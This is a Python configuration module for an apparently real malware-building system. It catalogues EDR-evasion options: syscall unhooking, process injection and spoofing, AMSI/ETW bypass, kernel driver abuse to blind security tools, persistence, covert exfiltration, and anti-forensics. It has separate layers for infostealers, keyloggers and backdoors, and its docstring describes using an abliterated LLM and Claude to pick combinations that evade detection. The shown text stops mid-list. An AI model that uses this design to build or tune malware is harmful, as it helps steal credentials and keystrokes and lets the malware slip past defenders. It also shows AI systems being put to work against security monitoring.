"""
Evasion layer selector — hybrid adaptive selection.

Tier 1 (runs 1-5): Algorithmic rule-based selection from detection signals.
  - Fast, no LLM cost, covers known detection patterns.
  - Tracks history to avoid repeating caught combinations.

Tier 2 (runs 6+): Escalate to LLM for deeper analysis.
  - Local LLM (Qwen3-35B) reviews detection + history + available options.
  - Can reason about WHY detection happened and make creative picks.

Tier 3 (if LLM fails): Escalate to cloud LLM (fugu/Claude).
  - Full architectural reasoning, can suggest new evasion approaches.

Each detection signal maps to specific layer changes.
"""

import json
import os
import random
import re
from pathlib import Path

CHUNKS_DIR = Path(__file__).parent
LLM_MODEL = "huihui-qwen3.6-35b-a3b-claude-4.7-opus-abliterated-mtp@f16"

LAYERS = {
    "api_resolve": {
        "description": "How Windows APIs are called",
        "options": {
            "direct_import":    {"risk": "high",   "desc": "Normal IAT imports — visible to static analysis"},
            "loadlibrary":      {"risk": "medium", "desc": "LoadLibrary+GetProcAddress at runtime"},
            "api_hash_djb2":    {"risk": "low",    "desc": "DJB2 hash resolution, no string refs in binary"},
            "api_hash_crc32":   {"risk": "low",    "desc": "CRC32 hash resolution variant"},
            "api_hash_fnv1a":   {"risk": "low",    "desc": "FNV-1a hash resolution — different constants from DJB2/CRC32"},
            "peb_walk":         {"risk": "vlow",   "desc": "Manual PEB walking, no LoadLibrary in IAT"},
            "indirect_syscall": {"risk": "vlow",   "desc": "Direct syscalls bypassing usermode hooks"},
            "ntdll_disk_remap":    {"risk": "medium", "desc": "Remap ntdll.dll from disk — restores clean copy, defeats userland hooks"},
            "ntdll_knowndlls":     {"risk": "low",    "desc": "Map clean ntdll from \\KnownDlls — no disk I/O, patchless unhooking"},
            "ntdll_suspend_remap": {"risk": "vlow",   "desc": "Clean ntdll from suspended child process — EDR hasn't hooked it yet"},
            "hookchain":           {"risk": "vlow",   "desc": "HookChain: rebuild syscall stubs from clean ntdll — no patching needed"},
            "syscall_halos_gate":  {"risk": "vlow",   "desc": "Halo's Gate — runtime SSN resolution with neighbor walk for hooked stubs"},
            "syscall_recycled":    {"risk": "vlow",   "desc": "RecycledGate — reuse existing ntdll syscall;ret gadgets"},
            "syscall_veh":         {"risk": "vlow",   "desc": "VEH + hardware breakpoint on ntdll — zero code modification syscalls"},
        },
        "default": "direct_import",
    },
    "execution": {
        "description": "How collector code runs",
        "options": {
            "sequential":    {"risk": "high",   "desc": "Direct calls in main()"},
            "threaded":      {"risk": "medium", "desc": "Each collector in its own thread"},
            "staged":        {"risk": "low",    "desc": "Staged execution with jitter between ops"},
            "fiber":         {"risk": "low",    "desc": "Fiber-based scheduling"},
            "callback_abuse":       {"risk": "vlow",   "desc": "Timer queue callbacks as execution vehicle"},
            "callback_enumwindows": {"risk": "low",    "desc": "EnumWindows callback vehicle"},
            "callback_certenumsystem":{"risk": "vlow", "desc": "CertEnumSystemStore callback — looks like cert management"},
            "callback_copyfile2":   {"risk": "vlow",   "desc": "CopyFile2 progress callback — looks like file operation"},
            "callback_enumrestype": {"risk": "vlow",   "desc": "EnumResourceTypes callback — minimal footprint"},
            "apc_self":             {"risk": "vlow",   "desc": "QueueUserAPC to own thread"},
        },
        "default": "sequential",
    },
    "process": {
        "description": "Process identity and lineage — what EDR sees as the running process",
        "options": {
            "standalone":     {"risk": "medium", "desc": "Normal standalone exe"},
            "ppid_spoof":              {"risk": "low",  "desc": "Spoofed parent process (explorer.exe)"},
            "ppid_spoof_svchost":      {"risk": "low",  "desc": "Spoofed parent (svchost.exe)"},
            "ppid_spoof_runtimebroker": {"risk": "vlow", "desc": "Spoofed parent (RuntimeBroker.exe)"},
            "ppid_spoof_sihost":       {"risk": "vlow", "desc": "Spoofed parent (sihost.exe)"},
            "ppid_spoof_taskhostw":     {"risk": "vlow", "desc": "Spoofed parent (taskhostw.exe)"},
            "ppid_spoof_dllhost":      {"risk": "vlow", "desc": "Spoofed parent (dllhost.exe — COM surrogate)"},
            "dll_sideload":   {"risk": "vlow",   "desc": "Proxy DLL loaded by signed MS binary"},
            "process_hollow": {"risk": "vlow",   "desc": "Hollowed legitimate process"},
            "process_ghost":  {"risk": "vlow",   "desc": "Ghost process — file deleted before EDR can scan"},
            "com_object":     {"risk": "vlow",   "desc": "COM in-proc server — loaded by legitimate process via CoCreateInstance"},
            "service_dll":    {"risk": "vlow",   "desc": "Service DLL in svchost.exe — runs as SYSTEM, blends with services"},
            "wmi_consumer":   {"risk": "vlow",   "desc": "WMI event consumer — wmiprvse.exe hosts the code"},
            "shell_extension": {"risk": "vlow",  "desc": "Explorer shell extension — runs inside explorer.exe"},
            "print_monitor":  {"risk": "vlow",   "desc": "Print monitor DLL — loaded by spoolsv.exe at boot"},
            "browser_extension": {"risk": "vlow", "desc": "Browser extension — runs inside browser sandbox"},
            "lsa_plugin":     {"risk": "vlow",   "desc": "LSA security package — loaded by lsass.exe"},
        },
        "default": "standalone",
    },
    "timing": {
        "description": "When operations execute",
        "options": {
            "immediate":    {"risk": "high",   "desc": "Execute immediately on launch"},
            "staged_jitter":{"risk": "medium", "desc": "Random delays between operations"},
            "deferred":     {"risk": "low",    "desc": "Sleep 5-30min before starting (sandbox evasion)"},
            "triggered":    {"risk": "vlow",   "desc": "Wait for user activity before starting"},
            "workday":      {"risk": "vlow",   "desc": "Only run during business hours"},
            "event_logon":  {"risk": "vlow",   "desc": "Trigger on user logon event (WMI subscription)"},
            "event_process":{"risk": "vlow",   "desc": "Trigger when specific process starts (e.g. browser)"},
            "burst_then_die":{"risk": "vlow",  "desc": "Execute everything in <2s, send, self-delete"},
        },
        "default": "immediate",
    },
    "data_obfuscation": {
        "description": "How strings and data are stored",
        "options": {
            "plaintext":    {"risk": "high",   "desc": "Raw string literals in .rdata"},
            "xor_encrypt":  {"risk": "medium", "desc": "XOR encryption with runtime decrypt"},
            "stack_strings":{"risk": "low",    "desc": "Build strings char-by-char on stack"},
            "aes_encrypt":  {"risk": "vlow",   "desc": "AES-128 encrypted strings"},
        },
        "default": "plaintext",
    },
    "anti_analysis": {
        "description": "Analysis environment detection",
        "options": {
            "none":         {"risk": "high",   "desc": "No checks"},
            "anti_debug":   {"risk": "medium", "desc": "IsDebuggerPresent + timing checks"},
            "anti_vm":      {"risk": "low",    "desc": "CPUID + registry VM detection"},
            "anti_sandbox": {"risk": "low",    "desc": "Mouse movement, resolution, uptime, process count"},
            "full":         {"risk": "vlow",   "desc": "All anti-analysis combined"},
            "canary_aware": {"risk": "vlow",   "desc": "Detect honeypot files/canary tokens — abort if found"},
            "geofence":     {"risk": "vlow",   "desc": "Check locale/timezone/keyboard — only run in target geography"},
            "exec_guardrails": {"risk": "vlow","desc": "Check domain/hostname/username — only run on intended target"},
        },
        "default": "none",
    },
    "etw_method": {
        "description": "ETW/AMSI bypass method",
        "options": {
            "patch":        {"risk": "medium", "desc": "Memory-patch EtwEventWrite — fast but detectable by integrity scan"},
            "hwbp_etw":     {"risk": "vlow",   "desc": "Hardware breakpoint on EtwEventWrite — patchless, defeats integrity checks"},
            "hwbp_both":    {"risk": "vlow",   "desc": "Hardware breakpoint on both EtwEventWrite + AmsiScanBuffer — full patchless"},
            "none":         {"risk": "high",   "desc": "No ETW/AMSI bypass"},
        },
        "default": "patch",
    },
    "memory_residence": {
        "description": "Where executable code lives in memory",
        "options": {
            "native":          {"risk": "low",    "desc": "Run from EXE's own .text — image-backed by default"},
            "module_stomp":    {"risk": "vlow",   "desc": "Overwrite signed DLL .text — looks image-backed to VAD scanner"},
            "mapped_section":  {"risk": "vlow",   "desc": "SEC_IMAGE mapped phantom section — memory appears DLL-backed"},
            "rw_rx_flip":      {"risk": "low",    "desc": "Allocate RW, write, flip to RX — never RWX at once"},
            "rx_reuse":        {"risk": "vlow",   "desc": "Reuse existing RX region from loaded DLL — zero new allocation"},
        },
        "default": "native",
    },
    "stack_presentation": {
        "description": "How return addresses appear on the call stack",
        "options": {
            "honest":              {"risk": "medium", "desc": "Real return addresses — points into our code"},
            "ret_spoof":           {"risk": "vlow",   "desc": "Spoofed return addresses — points into legitimate DLLs"},
            "full_frame_spoof":    {"risk": "vlow",   "desc": "Full stack frame chain spoofing — multiple fake frames in legit DLLs"},
            "dynamic_timer_spoof": {"risk": "vlow",   "desc": "Timer-based dynamic spoofing — stack changes per callback cycle"},
            "silent_moonwalk":     {"risk": "vlow",   "desc": "SilentMoonwalk — abuse unwind info to hide call origin"},
        },
        "default": "honest",
    },
    "sleep_mode": {
        "description": "How persistent payloads protect memory during idle",
        "options": {
            "basic":        {"risk": "high",   "desc": "Plain Sleep() — memory scannable during idle"},
            "jitter":       {"risk": "medium", "desc": "Randomized sleep intervals — timing analysis resistant"},
            "encrypt":      {"risk": "low",    "desc": "XOR-encrypt buffers during sleep"},
            "ekko":         {"risk": "vlow",   "desc": "Ekko-style ROP — encrypt entire region + PAGE_NOACCESS during sleep"},
            "zilean":       {"risk": "vlow",   "desc": "Zilean WaitableTimer + NtContinue — different API surface from Ekko"},
            "foliage":      {"risk": "vlow",   "desc": "Foliage APC-based sleep — no timer objects, pure APC chain"},
            "gargoyle":     {"risk": "vlow",   "desc": "Gargoyle ROP + PAGE_NOACCESS — code non-executable during sleep"},
            "death_sleep":  {"risk": "vlow",   "desc": "DeathSleep — unmap entire image during sleep, invisible to memory scan"},
        },
        "default": "basic",
    },
    "exfil": {
        "description": "Data exfiltration method",
        "options": {
            "tcp_direct":        {"risk": "high",   "desc": "Raw TCP socket connection"},
            "http_post":         {"risk": "medium", "desc": "HTTP POST (looks like web traffic)"},
            "https_post":        {"risk": "low",    "desc": "HTTPS POST to port 443 — blends with web traffic"},
            "winhttp_get":       {"risk": "low",    "desc": "HTTP GET with encoded params — looks like browsing"},
            "winhttp_api":       {"risk": "low",    "desc": "WinHTTP API — looks like software update check"},
            "dns_exfil":         {"risk": "vlow",   "desc": "DNS TXT record queries"},
            "dns_txt":           {"risk": "vlow",   "desc": "DNS TXT queries with base32 encoding"},
            "smb_write":         {"risk": "low",    "desc": "SMB file write — blends with file server traffic"},
            "http_get_chunks":   {"risk": "low",    "desc": "Hex in GET params — looks like API polling"},
            "named_pipe":        {"risk": "low",    "desc": "Named pipe — no network footprint"},
            "certutil_lolbin":   {"risk": "medium", "desc": "certutil -encode + certutil -urlcache — LOLBin"},
            "bitsadmin_lolbin":  {"risk": "medium", "desc": "BITSAdmin transfer job — LOLBin"},
            "powershell_lolbin": {"risk": "medium", "desc": "Invoke-WebRequest — LOLBin"},
            "cscript_lolbin":    {"risk": "medium", "desc": "cscript WScript.Shell — LOLBin"},
            "mshta_lolbin":      {"risk": "medium", "desc": "mshta javascript — LOLBin"},
            "curl_lolbin":       {"risk": "medium", "desc": "curl.exe POST — LOLBin"},
            "cloud_onedrive":    {"risk": "vlow",   "desc": "Drop file in OneDrive folder — sync client handles network"},
            "cloud_gdrive":      {"risk": "vlow",   "desc": "Drop file in Google Drive folder — sync client handles network"},
            "email_mapi":        {"risk": "vlow",   "desc": "Send via Outlook COM (MAPI) — looks like user sending email"},
            "paste_site":        {"risk": "vlow",   "desc": "HTTPS POST to paste service — looks like dev tool usage"},
            "dead_drop":         {"risk": "vlow",   "desc": "Write to shared location — attacker retrieves separately"},
            "dead_drop_cloud":   {"risk": "vlow",   "desc": "Drop in cloud sync folder (OneDrive/GDrive) — sync client uploads"},
            "browser_post":      {"risk": "vlow",   "desc": "Inject JS into browser to POST — network from browser process"},
            "steganography":     {"risk": "vlow",   "desc": "Embed data in image, upload to legitimate service"},
        },
        "default": "tcp_direct",
    },
    "persistence": {
        "description": "Staying on target after reboot",
        "options": {
            "none":              {"risk": "low",    "desc": "Run once and exit"},
            "registry_run":      {"risk": "medium", "desc": "HKCU Run key"},
            "scheduled_task":    {"risk": "medium", "desc": "Windows scheduled task"},
            "startup_folder":    {"risk": "medium", "desc": "Shortcut in Startup folder"},
            "service":           {"risk": "high",   "desc": "Windows service (requires admin)"},
            "com_hijack":        {"risk": "vlow",   "desc": "Override frequent COM CLSID — loaded by legitimate process"},
            "dll_search_order":  {"risk": "vlow",   "desc": "DLL in search path of auto-start exe — no registry change"},
            "ifeo_debugger":     {"risk": "low",    "desc": "IFEO debugger for common binary — runs on target launch"},
            "print_monitor_persist": {"risk": "vlow", "desc": "Print monitor DLL — loaded by spoolsv at boot as SYSTEM"},
            "network_provider":  {"risk": "vlow",   "desc": "Network provider DLL — loaded at logon by mpnotify.exe"},
            "wmi_subscription":  {"risk": "low",    "desc": "WMI permanent event subscription — survives reboot"},
            "accessibility_replace": {"risk": "low","desc": "Replace sethc/utilman — triggered from login screen as SYSTEM"},
        },
        "default": "none",
    },
    "injection_method": {
        "description": "How code enters target process — only relevant when process != standalone",
        "options": {
            "none":              {"risk": "low",    "desc": "No injection — run in own process"},
            "classic_remote":    {"risk": "high",   "desc": "VirtualAllocEx + WriteProcessMemory + CreateRemoteThread"},
            "earlybird_apc":     {"risk": "medium", "desc": "EarlyBird APC to suspended thread — code runs before EDR hooks"},
            "threadless":        {"risk": "vlow",   "desc": "Threadless injection — hijack existing thread execution flow"},
            "doppelganging":     {"risk": "vlow",   "desc": "Process Doppelganging — NTFS transaction, no disk artifact"},
            "herpaderping":      {"risk": "vlow",   "desc": "Process Herpaderping — modify file after creation, before scan"},
            "phantom_dll":       {"risk": "vlow",   "desc": "Phantom DLL Hollowing — inject into phantom-mapped DLL section"},
            "kcb_hijack":        {"risk": "vlow",   "desc": "KernelCallbackTable hijack — triggered by window message, no thread"},
        },
        "default": "none",
    },
    "network_stealth": {
        "description": "Network-level fingerprint evasion beyond transport choice",
        "options": {
            "none":           {"risk": "medium", "desc": "Default TLS/HTTP stack — fingerprintable by JA3/JA4"},
            "ja3_spoof":      {"risk": "vlow",   "desc": "Spoof JA3 hash to match Chrome/Edge TLS fingerprint"},
            "domain_front":   {"risk": "vlow",   "desc": "Domain fronting — SNI points to legit CDN, Host header to C2"},
            "doh_tunnel":     {"risk": "vlow",   "desc": "DNS-over-HTTPS tunnel — encrypted DNS bypasses DPI"},
            "legitimate_api": {"risk": "vlow",   "desc": "Use legitimate cloud API (Notion/Slack/Telegram) as C2 channel"},
        },
        "default": "none",
    },
    # ────────────────────────────────────────────────────────────
    # ARCHITECTURAL LAYERS — change what EDR's behavioral engine sees
    # These sit ABOVE implementation layers and constrain them.
    # ────────────────────────────────────────────────────────────
    "data_staging": {
        "description": "Where collected data lives before exfiltration",
        "options": {
            "memory_only":    {"risk": "vlow",   "desc": "Heap buffer — zero disk writes, lost on crash"},
            "temp_file":      {"risk": "medium", "desc": "%%TEMP%% file — filesystem visible but common"},
            "registry":       {"risk": "low",    "desc": "Registry values under legit-looking key"},
            "ads":            {"risk": "vlow",   "desc": "NTFS Alternate Data Stream — hidden from dir/Explorer"},
            "wmi_repo":       {"risk": "vlow",   "desc": "WMI class properties — persistent, rarely monitored"},
            "event_log":      {"risk": "vlow",   "desc": "Custom event log entries — looks like app logging"},
            "shared_memory":  {"risk": "vlow",   "desc": "Named section / memory-mapped file — no disk I/O"},
            "browser_storage":{"risk": "vlow",   "desc": "Browser localStorage/IndexedDB — inside browser data"},
        },
        "default": "memory_only",
    },
    "anti_forensics": {
        "description": "Structural cleanup approach after execution",
        "options": {
            "none":            {"risk": "high",   "desc": "Leave everything — full forensic trail"},
            "self_delete":     {"risk": "medium", "desc": "Binary deletes itself after execution"},
            "timestomp":       {"risk": "low",    "desc": "Modify file timestamps to blend with system files"},
            "memory_only_full":{"risk": "vlow",   "desc": "Never touch disk — fileless from start to finish"},
            "blend_noise":     {"risk": "vlow",   "desc": "Generate legitimate-looking activity to dilute signal"},
        },
        "default": "none",
    },
    "process_lifetime": {
        "description": "How long the malware process exists — shapes behavioral analysis window",
        "options": {
            "ephemeral_seconds":  {"risk": "vlow",   "desc": "Run <10s then exit — too fast for behavioral engine"},
            "ephemeral_staged":   {"risk": "vlow",   "desc": "Multiple short instances, each collecting one thing"},
            "medium_minutes":     {"risk": "low",    "desc": "2-15min with pacing — looks like user interaction"},
            "persistent":         {"risk": "medium", "desc": "Hours/days as background service"},
            "burst_and_die":      {"risk": "vlow",   "desc": "<2s full speed then self-delete — outrun analysis"},
        },
        "default": "ephemeral_seconds",
    },
    # ────────────────────────────────────────────────────────────
    # KERNEL-LEVEL EVASION LAYERS — Ring-0 techniques for blinding EDR
    # These go beyond userland evasion into the kernel driver layer.
    # ────────────────────────────────────────────────────────────
    "kernel_evasion": {
        "description": "Ring-0 access method — how to gain kernel read/write for EDR blinding",
        "options": {
            "none":           {"risk": "low",    "desc": "No kernel-level evasion (userland only)"},
            "byovd_rtcore":   {"risk": "high",   "desc": "RTCore64.sys — arbitrary kernel R/W, widely blocklisted"},
            "byovd_dbutil":   {"risk": "high",   "desc": "dbutil_2_3.sys — Dell BIOS driver, less blocklisted"},
            "byovd_procexp":  {"risk": "medium", "desc": "PROCEXP.SYS — Microsoft-signed, PPL termination only"},
            "byovd_custom":   {"risk": "high",   "desc": "Custom/0-day vulnerable driver — not in any blocklist"},
        },
        "default": "none",
    },
    "callback_evasion": {
        "description": "Which kernel notification callbacks to remove — blinds EDR telemetry",
        "options": {
            "none":               {"risk": "low",    "desc": "No callback manipulation"},
            "process_callbacks":  {"risk": "high",   "desc": "Remove PsSetCreateProcessNotifyRoutine — hides process creation"},
            "thread_callbacks":   {"risk": "high",   "desc": "Remove PsSetCreateThreadNotifyRoutine — hides thread injection"},
            "image_callbacks":    {"risk": "high",   "desc": "Remove PsSetLoadImageNotifyRoutine — hides DLL/driver loads"},
            "object_callbacks":   {"risk": "high",   "desc": "Remove ObRegisterCallbacks — strips handle protection on EDR/lsass"},
            "minifilter_unlink":  {"risk": "high",   "desc": "Unlink minifilter from FltMgr — hides file I/O from EDR"},
            "total_blind":        {"risk": "high",   "desc": "Remove ALL callback types — EDR receives zero telemetry"},
        },
        "default": "none",
    },
    "process_protection": {
        "description": "DKOM/PPL manipulation on kernel objects",
        "options": {
            "none":           {"risk": "low",    "desc": "Standard process, no kernel object manipulation"},
            "hide_process":   {"risk": "high",   "desc": "DKOM ActiveProcessLinks unlinking — invisible to task manager/EDR"},
            "elevate_ppl":    {"risk": "high",   "desc": "Set EPROCESS->Protection to PPL-AM — immune to EDR termination"},
            "strip_edr_ppl":  {"risk": "high",   "desc": "Remove EDR's PPL protection — allows standard TerminateProcess"},
            "token_steal":    {"risk": "high",   "desc": "Copy SYSTEM token via EPROCESS->Token DKOM — instant privilege escalation"},
        },
        "default": "none",
    },
    "etw_kernel": {
        "description": "Kernel-level ETW manipulation — silence threat intelligence provider",
        "options": {
            "none":             {"risk": "low",    "desc": "No kernel ETW manipulation (use userland etw_method instead)"},
            "dkom_provider":    {"risk": "high",   "desc": "DKOM on ETW-TI provider registration — disables kernel telemetry"},
            "session_unlink":   {"risk": "high",   "desc": "Remove EDR consumer from ETW session — events fire but nobody receives"},
            "hwbp_veh":         {"risk": "medium", "desc": "Hardware breakpoint + VEH on EtwEventWrite — patchless userland bypass"},
        },
        "default": "none",
    },
}

# ────────────────────────────────────────────────────────────
# TYPE-SPECIFIC ARCHITECTURAL LAYERS
# Only apply to their respective malware types.
# ────────────────────────────────────────────────────────────
TYPE_LAYERS = {
    "infostealer": {
        "collection_strategy": {
            "description": "When and how data is gathered — shapes the access pattern EDR sees",
            "options": {
                "bulk_immediate":    {"risk": "high",   "desc": "All collectors run in 5s — recognizable burst"},
                "incremental_slow":  {"risk": "vlow",   "desc": "One data source per hour/day — time-spread defeats correlation"},
                "event_triggered":   {"risk": "vlow",   "desc": "Collect only when high-value event happens (banking site opened)"},
                "memory_scraping":   {"risk": "low",    "desc": "Read other processes' memory for decrypted creds — never touch files"},
                "clipboard_watch":   {"risk": "vlow",   "desc": "Monitor clipboard for passwords/crypto — single API, lightweight"},
                "piggyback_legit":   {"risk": "vlow",   "desc": "Copy data when legitimate backup/sync tool accesses it"},
                "on_demand":         {"risk": "vlow",   "desc": "Collect nothing until operator sends command"},
            },
            "default": "bulk_immediate",
        },
        "target_scope": {
            "description": "What data to collect — narrower scope = smaller detection surface",
            "options": {
                "comprehensive":     {"risk": "high",   "desc": "Browser + DPAPI + wallets + email + files + screenshots"},
                "browser_only":      {"risk": "low",    "desc": "Only browser cookies/passwords/history"},
                "credential_only":   {"risk": "medium", "desc": "Only passwords/tokens from credential stores"},
                "clipboard_only":    {"risk": "vlow",   "desc": "Only clipboard monitoring — minimal footprint"},
                "session_tokens":    {"risk": "low",    "desc": "Only active session cookies/tokens from memory"},
                "file_targeted":     {"risk": "low",    "desc": "Only specific files (*.doc, *.pdf) — looks like backup tool"},
                "environment_recon": {"risk": "vlow",   "desc": "Only system info + processes — looks like inventory tool"},
            },
            "default": "comprehensive",
        },
    },
    "keylogger": {
        "capture_method": {
            "description": "How keystrokes are intercepted — THE most impactful keylogger dimension",
            "options": {
                "hook_ll":           {"risk": "high",   "desc": "SetWindowsHookEx(WH_KEYBOARD_LL) — classic, heavily monitored"},
                "getasynckeystate":  {"risk": "low",    "desc": "GetAsyncKeyState polling — legitimate game/accessibility pattern"},
                "raw_input":         {"risk": "low",    "desc": "RegisterRawInputDevices + WM_INPUT — HID level capture"},
                "directinput":       {"risk": "vlow",   "desc": "DirectInput8 keyboard device — looks like a game"},
                "ui_automation":     {"risk": "vlow",   "desc": "UI Automation TextChanged events — indistinguishable from screen reader"},
                "clipboard_monitor": {"risk": "vlow",   "desc": "AddClipboardFormatListener — catches password manager pastes"},
                "etw_consumer":      {"risk": "vlow",   "desc": "ETW HID/keyboard provider — looks like diagnostic tool"},
                "ime_hijack":        {"risk": "vlow",   "desc": "Custom IME/TSF registration — OS loads into every text input process"},
                "getkeybstate":      {"risk": "low",    "desc": "GetKeyboardState for full 256-key array — one call per poll"},
                "screen_ocr":        {"risk": "vlow",   "desc": "Screen capture + OCR — no keyboard API calls at all"},
                "winevent_hook":     {"risk": "low",    "desc": "SetWinEventHook for text change events — accessibility API"},
                "msg_hook":          {"risk": "medium", "desc": "SetWindowsHookEx(WH_GETMESSAGE) — intercepts WM_KEYDOWN"},
            },
            "default": "getasynckeystate",
        },
        "capture_tempo": {
            "description": "When the keylogger actively captures — shapes temporal behavioral pattern",
            "options": {
                "continuous":        {"risk": "medium", "desc": "24/7 capture — maximum data, maximum exposure"},
                "business_hours":    {"risk": "low",    "desc": "Mon-Fri 9-5 — matches human work pattern"},
                "foreground_app":    {"risk": "vlow",   "desc": "Only when specific apps in foreground (browser, email)"},
                "url_specific":      {"risk": "vlow",   "desc": "Only when banking/login URLs detected — banking trojan model"},
                "burst_capture":     {"risk": "low",    "desc": "5min on, 25min off — short observation windows"},
                "event_triggered":   {"risk": "vlow",   "desc": "Only after specific event (VPN connect, USB insert)"},
                "human_paced":       {"risk": "vlow",   "desc": "Randomized intervals matching natural human activity"},
            },
            "default": "continuous",
        },
    },
    "backdoor": {
        "c2_paradigm": {
            "description": "C2 communication model — THE most detectable backdoor dimension",
            "options": {
                "active_beacon":     {"risk": "high",   "desc": "Periodic phone-home — classic IOA target"},
                "passive_listener":  {"risk": "low",    "desc": "Bind shell — no outbound connections, waits for inbound"},
                "dead_drop_cloud":   {"risk": "vlow",   "desc": "Read/write OneDrive/GDrive/S3 — traffic to Microsoft/Google"},
                "dead_drop_dns":     {"risk": "vlow",   "desc": "Commands in DNS TXT records — only DNS queries"},
                "triggered_file":    {"risk": "vlow",   "desc": "Dormant until trigger file appears — zero activity until then"},
                "triggered_pipe":    {"risk": "vlow",   "desc": "Named pipe wait — operator connects, no network from implant"},
                "email_c2":          {"risk": "vlow",   "desc": "IMAP/MAPI for commands, email for results — standard mail traffic"},
                "legit_service_poll":{"risk": "vlow",   "desc": "Poll GitHub/RSS/Telegram for encoded commands — HTTPS to trusted domains"},
                "p2p_mesh":          {"risk": "vlow",   "desc": "Talk to other implants only — one node phones home"},
                "domain_front":      {"risk": "vlow",   "desc": "HTTPS to CDN — SNI shows legitimate domain, Host routes to C2"},
                "serverless_c2":     {"risk": "vlow",   "desc": "AWS Lambda/Cloudflare Workers — new IP per request"},
                "websocket":         {"risk": "low",    "desc": "WebSocket upgrade — looks like web app real-time channel"},
            },
            "default": "active_beacon",
        },
        "cmd_execution": {
            "description": "How received commands are executed — determines parent-child process chains",
            "options": {
                "in_process":        {"risk": "vlow",   "desc": "All via Windows API in own process — zero child processes"},
                "child_cmd":         {"risk": "high",   "desc": "Spawn cmd.exe /c — obvious parent-child chain"},
                "child_ps":          {"risk": "high",   "desc": "Spawn powershell.exe — AMSI + ScriptBlock logging"},
                "lolbin_proxy":      {"risk": "medium", "desc": "LOLBins (certutil, bitsadmin, wmic) — signed binaries"},
                "wmi_exec":          {"risk": "low",    "desc": "WMI ExecMethod — command runs as wmiprvse.exe child"},
                "schtasks_exec":     {"risk": "low",    "desc": "One-shot scheduled task — clean parent chain via svchost"},
                "com_exec":          {"risk": "vlow",   "desc": "COM object instantiation — ShellBrowserWindow, MMC20.Application"},
                "clr_host":          {"risk": "low",    "desc": "Host .NET CLR, execute C# — no powershell.exe needed"},
                "embedded_script":   {"risk": "low",    "desc": "Embedded Lua/ChakraCore for complex ops — no external interpreter"},
            },
            "default": "in_process",
        },
        "stage_architecture": {
            "description": "Structural composition — modular vs monolithic",
            "options": {
                "monolithic":        {"risk": "medium", "desc": "Single binary, all functionality — simple but fully exposed if caught"},
                "staged_loader":     {"risk": "low",    "desc": "Small loader downloads full implant — each independently replaceable"},
                "modular_plugins":   {"risk": "vlow",   "desc": "Minimal C2 core + capability modules loaded on demand"},
                "cooperative_multi": {"risk": "vlow",   "desc": "Multiple small binaries each doing ONE thing — capturing one reveals little"},
                "disposable":        {"risk": "vlow",   "desc": "Different binary per operation phase — each deployed, used, deleted"},
            },
            "default": "monolithic",
        },
    },
}

# ────────────────────────────────────────────────────────────
# ARCHITECTURAL CONSTRAINTS — hierarchy rules
# Architecture constrains implementation: some combos are invalid.
# Format: if layer_a == value_a, then layer_b must be in [allowed] or must not be in [blocked].
# ────────────────────────────────────────────────────────────
ARCH_CONSTRAINTS = [
    # Process identity constrains persistence
    {"if": ("process", "com_object"), "then_prefer": {"persistence": ["com_hijack", "none"]}},
    {"if": ("process", "service_dll"), "then_prefer": {"persistence": ["service", "none"]}},
    {"if": ("process", "wmi_consumer"), "then_prefer": {"persistence": ["wmi_subscription", "none"]}},
    {"if": ("process", "print_monitor"), "then_prefer": {"persistence": ["print_monitor_persist", "network_provider", "none"]}},
    {"if": ("process", "shell_extension"), "then_prefer": {"persistence": ["com_hijack", "scheduled_task", "dll_search_order", "registry_run", "network_provider", "none"]}},
    {"if": ("process", "browser_extension"), "then_prefer": {"persistence": ["none", "com_hijack"]}},

    # Cloud exfil prefers file-backed staging but memory_only works (API stream upload)
    {"if": ("exfil", "cloud_onedrive"), "then_prefer": {"data_staging": ["temp_file", "ads", "memory_only", "wmi_repo", "browser_storage"]}},
    {"if": ("exfil", "cloud_gdrive"), "then_prefer": {"data_staging": ["temp_file", "ads", "memory_only", "wmi_repo", "browser_storage"]}},

    # Ephemeral lifetime constrains persistence (no point persisting a 2s process)
    {"if": ("process_lifetime", "burst_and_die"), "then_prefer": {"persistence": ["none"]}},
    {"if": ("process_lifetime", "ephemeral_seconds"), "then_prefer": {"persistence": ["none", "scheduled_task", "com_hijack", "dll_search_order", "network_provider", "wmi_subscription"]}},

    # Memory-only forensics requires memory-only staging
    {"if": ("anti_forensics", "memory_only_full"), "then_prefer": {"data_staging": ["memory_only", "shared_memory"]}},

    # Triggered timing works best with triggered C2 paradigm for backdoors
    {"if": ("timing", "event_logon"), "then_prefer": {"process_lifetime": ["ephemeral_staged", "medium_minutes", "persistent"]}},

    # Self-delete forensics pairs with burst lifetime
    {"if": ("anti_forensics", "self_delete"), "then_prefer": {"process_lifetime": ["ephemeral_seconds", "burst_and_die", "medium_minutes"]}},

    # Kernel evasion constraints — callback/DKOM/ETW-kernel require Ring-0 access first
    {"if": ("kernel_evasion", "none"), "then_prefer": {
        "callback_evasion": ["none"],
        "process_protection": ["none"],
    }},
    # ETW kernel DKOM and session unlink require Ring-0; hwbp_veh is userland-only
    {"if": ("etw_kernel", "dkom_provider"), "then_prefer": {"kernel_evasion": ["byovd_dbutil", "byovd_rtcore", "byovd_custom"]}},
    {"if": ("etw_kernel", "session_unlink"), "then_prefer": {"kernel_evasion": ["byovd_dbutil", "byovd_rtcore", "byovd_custom"]}},
    # PROCEXP driver can only terminate processes, not do full R/W — limit to PPL stripping
    {"if": ("kernel_evasion", "byovd_procexp"), "then_prefer": {
        "callback_evasion": ["none"],
        "process_protection": ["strip_edr_ppl", "none"],
        "etw_kernel": ["none"],
    }},
    # total_blind requires full R/W driver, not just process termination
    {"if": ("callback_evasion", "total_blind"), "then_prefer": {"kernel_evasion": ["byovd_dbutil", "byovd_rtcore", "byovd_custom"]}},

    # injection_method=none for standalone/simple process types
    {"if": ("process", "standalone"), "then_prefer": {"injection_method": ["none", "kcb_hijack"]}},
    # Process hollowing/ghosting already handle code placement — no separate injection needed
    {"if": ("process", "process_hollow"), "then_prefer": {"injection_method": ["none"]}},
    {"if": ("process", "process_ghost"), "then_prefer": {"injection_method": ["none"]}},

    # network_stealth is irrelevant for non-network exfil — allow any value
    {"if": ("exfil", "named_pipe"), "then_prefer": {"network_stealth": ["none", "ja3_spoof", "domain_front", "doh_tunnel", "legitimate_api"]}},
    {"if": ("exfil", "dead_drop"), "then_prefer": {"network_stealth": ["none", "ja3_spoof", "domain_front", "doh_tunnel", "legitimate_api"]}},
    {"if": ("exfil", "dead_drop_cloud"), "then_prefer": {"network_stealth": ["none", "ja3_spoof", "domain_front", "doh_tunnel", "legitimate_api"]}},

    # Domain fronting only works with HTTPS
